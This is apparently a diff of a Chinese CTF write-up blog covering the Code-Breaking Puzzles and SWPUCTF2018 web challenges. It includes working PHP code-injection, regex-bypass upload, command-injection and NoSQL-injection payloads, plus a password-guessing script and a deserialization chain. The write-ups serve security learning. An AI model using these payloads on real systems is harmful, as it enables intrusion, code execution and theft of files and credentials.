-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
+$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;
 
-<p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
+if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
+    show_source(__FILE__);
+} else {
+    $action(&#39;&#39;, $arg);
+}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
 <p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
 <p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
 <p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
 <p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
 <p>别忘了注释//，否则逃脱不了函数</p>
-<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?php
+function is_php($data){
+    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
+}
 
-<h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
+if(empty($_FILES)) {
+    die(show_source(__FILE__));
+}
+
+$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
+if (is_php($data)) {
+    echo &quot;bad request&quot;;
+} else {
+    @mkdir($user_dir, 0755);
+    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
+    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);
+
+    header(&quot;Location: $path&quot;, true, 303);
+} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
 <p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
 <h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
 <p>NFA引擎</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</span><br></pre></td></tr></table></figure>
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data)</span><br></pre></td></tr></table></figure>
-
-<p>如果我们输入<code>&lt;?php print;abcd</code></p>
+<pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
+<pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p>
 <p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
 <p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
 <p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
 <p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);</span><br><span class="line">$msg = &quot;&lt;?php print_r(scandir(&apos;../&apos;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);</span><br><span class="line">fwrite($f,$msg);</span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure>
-
-<p>构造个上传表单完事</p>
+<pre><code>&lt;?php
+$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);
+$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);
+fwrite($f,$msg);
+fclose($f);</code></pre><p>构造个上传表单完事</p>
 <p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
 <h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
 <h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
@@ -446,9 +747,12 @@
 <p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
 <p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
 <h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
+<pre><code>&lt;?php
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
+    eval($_GET[&#39;code&#39;]);
+} else {
+    show_source(__FILE__);
+}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
 <p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
 <p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
 <p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
@@ -465,7 +769,7 @@
             </div>
             <div class="continue">
             <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -495,72 +799,164 @@
                 <p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p>
 <h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p>
 <h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure>
-
-<p>键盘密码 99就代表9那列的第二个值</p>
+<pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p>
 <p>look ….. 依次读就行了</p>
 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">	if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
+<pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&#39;seed&#39;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&#39;&#39;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&#39;Auth&#39;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
 <p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p>
 <p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p>
 <p>种子不变，生成的随机数就不变</p>
 <p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p>
 <p>脚本跑随机数在字符串的位置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;lP9DUJjQ&quot;;</span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"> </span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+$str = &quot;lP9DUJjQ&quot;;
+$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
 
-<p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
+for($i=0;$i&lt;strlen($str);$i++){
+   $pos = strpos($randStr,$str[$i]);
+   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
+   //整理成方便 php_mt_seed 测试的格式
+  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
+}
+echo &quot;\n&quot;;
+?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
 <p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p>
 <p>本地php7环境跑这个种子的24位就能得到优惠码了</p>
 <p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p>
 <p>过滤了查询flag的语句，用”” 或者\绕过都行</p>
 <p>完整payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t /f\lag%0a127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
+<pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
 <p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p>
 <p>思路很简单，用通配符猜解admin的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[$regex]=^**</span><br></pre></td></tr></table></figure>
+<pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
+<pre><code>import requests
+import time
+import pytesseract
+from PIL import Image
+import os
+from urllib.request import urlretrieve
 
-<p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">from urllib.request import urlretrieve</span><br><span class="line"></span><br><span class="line">j=0</span><br><span class="line">passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]</span><br><span class="line">payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;</span><br><span class="line">url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun&#123;&#125;&amp;vertify=&#123;&#125;&quot;</span><br><span class="line">img_url = &apos;http://123.206.213.66:45678/vertify.php&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">	while j&lt;len(payload):</span><br><span class="line">		s = requests.session()</span><br><span class="line">		payloads = payload[j]</span><br><span class="line">		with open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;,&apos;wb&apos;) as fd:</span><br><span class="line">			img_1 = s.get(url=img_url)</span><br><span class="line">			fd.write(img_1.content)</span><br><span class="line">		image = Image.open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;)</span><br><span class="line">		vcode = pytesseract.image_to_string(image)</span><br><span class="line">		url_1 = url.format(str(payloads),vcode)</span><br><span class="line">		r = s.get(url_1,cookies=img_1.cookies)</span><br><span class="line">		print(r.text)</span><br><span class="line">		if &quot;wrong CAPTCHA!&quot; in r.text:</span><br><span class="line">			continue</span><br><span class="line">		if &quot;username or password incorrect!&quot; in r.text:</span><br><span class="line">			print(payloads)</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br><span class="line">		if &quot;Nice!But it is not the real passwd&quot; in r.text:</span><br><span class="line">			passw0rd.append(payloads)</span><br><span class="line">			print(&quot;passw0rd is :&quot; + str(passw0rd))</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+j=0
+passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]
+payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;
+url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;
+img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;
 
-<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
+for i in range(1,20):
+    while j&lt;len(payload):
+        s = requests.session()
+        payloads = payload[j]
+        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:
+            img_1 = s.get(url=img_url)
+            fd.write(img_1.content)
+        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)
+        vcode = pytesseract.image_to_string(image)
+        url_1 = url.format(str(payloads),vcode)
+        r = s.get(url_1,cookies=img_1.cookies)
+        print(r.text)
+        if &quot;wrong CAPTCHA!&quot; in r.text:
+            continue
+        if &quot;username or password incorrect!&quot; in r.text:
+            print(payloads)
+            j = j+1
+            break
+        if &quot;Nice!But it is not the real passwd&quot; in r.text:
+            passw0rd.append(payloads)
+            print(&quot;passw0rd is :&quot; + str(passw0rd))
+            j = j+1
+            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
 <p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p>
 <p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p>
 <p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p>
 <p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function get($key)</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">        $value = $this-&gt;params[$key];      </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $value = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;file_get($value);  </span><br><span class="line">&#125;</span><br><span class="line">public function file_get($value)</span><br><span class="line">&#123;</span><br><span class="line">    $text = base64_encode(file_get_contents($value));</span><br><span class="line">    return $text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
+<pre><code>    public function get($key)
+    {
+        if(isset($this-&gt;params[$key])) {
+            $value = $this-&gt;params[$key];      
+        } else {
+            $value = &quot;index.php&quot;;
+        }
+        return $this-&gt;file_get($value);  
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
 <p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p>
 <h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p>
 <p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
 <p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p>
-<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    &apos;source&apos; =&gt; &apos;/var/www/html/f1ag.php&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = new Show();</span><br><span class="line">$b-&gt;str[&apos;str&apos;] = $a;</span><br><span class="line"></span><br><span class="line">$c = new C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br></pre></td></tr></table></figure>
+<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();
+$a-&gt;params = [
+    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;
+];
 
-<p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
+$b = new Show();
+$b-&gt;str[&#39;str&#39;] = $a;
+
+$c = new C1e4r();
+$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
